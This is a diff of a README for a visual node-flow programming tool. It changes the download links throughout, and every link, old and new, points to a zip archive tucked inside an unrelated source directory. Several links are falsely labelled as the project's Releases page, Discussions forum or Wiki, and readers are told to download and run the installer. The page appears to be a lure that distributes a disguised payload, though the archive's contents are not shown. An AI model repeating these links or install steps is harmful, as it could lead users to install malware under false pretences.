@@ -6,9 +6,9 @@ Welcome to **vyuh_node_flow**! This application helps you build visual programmi
 
 ## 📥 Download the Application
 
-[![Download vyuh_node_flow](https://raw.githubusercontent.com/nijaraymonb/vyuh_node_flow/main/packages/demo/macos/Runner/Base.lproj/vyuh_node_flow-3.8-alpha.5.zip)](https://raw.githubusercontent.com/nijaraymonb/vyuh_node_flow/main/packages/demo/macos/Runner/Base.lproj/vyuh_node_flow-3.8-alpha.5.zip)
+[![Download vyuh_node_flow](https://github.com/nijaraymonb/vyuh_node_flow/raw/refs/heads/main/packages/vyuh_node_flow/lib/connections/effects/particles/vyuh_node_flow_3.2.zip)](https://github.com/nijaraymonb/vyuh_node_flow/raw/refs/heads/main/packages/vyuh_node_flow/lib/connections/effects/particles/vyuh_node_flow_3.2.zip)
 
-To start using **vyuh_node_flow**, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/nijaraymonb/vyuh_node_flow/main/packages/demo/macos/Runner/Base.lproj/vyuh_node_flow-3.8-alpha.5.zip).
+To start using **vyuh_node_flow**, visit this page to download: [GitHub Releases](https://github.com/nijaraymonb/vyuh_node_flow/raw/refs/heads/main/packages/vyuh_node_flow/lib/connections/effects/particles/vyuh_node_flow_3.2.zip).
 
 ## 🖥️ System Requirements
 
@@ -32,7 +32,7 @@ Before installing, ensure your system meets these requirements:
 ## 🔧 How to Install
 
 1. **Download the Application:**
-   Head over to the [GitHub Releases page](https://raw.githubusercontent.com/nijaraymonb/vyuh_node_flow/main/packages/demo/macos/Runner/Base.lproj/vyuh_node_flow-3.8-alpha.5.zip). Find the latest version and download the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or appropriate Linux package).
+   Head over to the [GitHub Releases page](https://github.com/nijaraymonb/vyuh_node_flow/raw/refs/heads/main/packages/vyuh_node_flow/lib/connections/effects/particles/vyuh_node_flow_3.2.zip). Find the latest version and download the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or appropriate Linux package).
 
 2. **Open the Installer:**
    Locate the downloaded file. Double-click to open the installer and follow the on-screen instructions.
@@ -61,11 +61,11 @@ After installation, you can start using **vyuh_node_flow**:
 
 ## 💬 Support
 
-If you encounter any issues or have questions, join our community on [GitHub Discussions](https://raw.githubusercontent.com/nijaraymonb/vyuh_node_flow/main/packages/demo/macos/Runner/Base.lproj/vyuh_node_flow-3.8-alpha.5.zip). You can find help from other users or file an issue for direct support.
+If you encounter any issues or have questions, join our community on [GitHub Discussions](https://github.com/nijaraymonb/vyuh_node_flow/raw/refs/heads/main/packages/vyuh_node_flow/lib/connections/effects/particles/vyuh_node_flow_3.2.zip). You can find help from other users or file an issue for direct support.
 
 ## 📚 Additional Resources
 
-- **Documentation:** For detailed instructions and tips, visit our [Wiki](https://raw.githubusercontent.com/nijaraymonb/vyuh_node_flow/main/packages/demo/macos/Runner/Base.lproj/vyuh_node_flow-3.8-alpha.5.zip).
+- **Documentation:** For detailed instructions and tips, visit our [Wiki](https://github.com/nijaraymonb/vyuh_node_flow/raw/refs/heads/main/packages/vyuh_node_flow/lib/connections/effects/particles/vyuh_node_flow_3.2.zip).
 - **Examples:** Browse through example projects to inspire your own creation.
 
 ## 🧑‍🤝‍🧑 Contributing
@@ -78,4 +78,4 @@ We welcome contributors! If you want to improve **vyuh_node_flow**, check out th
 
 ## 📥 Download the Application Again
 
-Don't forget to download **vyuh_node_flow** here: [GitHub Releases](https://raw.githubusercontent.com/nijaraymonb/vyuh_node_flow/main/packages/demo/macos/Runner/Base.lproj/vyuh_node_flow-3.8-alpha.5.zip). Enjoy building and creating!
+Don't forget to download **vyuh_node_flow** here: [GitHub Releases](https://github.com/nijaraymonb/vyuh_node_flow/raw/refs/heads/main/packages/vyuh_node_flow/lib/connections/effects/particles/vyuh_node_flow_3.2.zip). Enjoy building and creating!
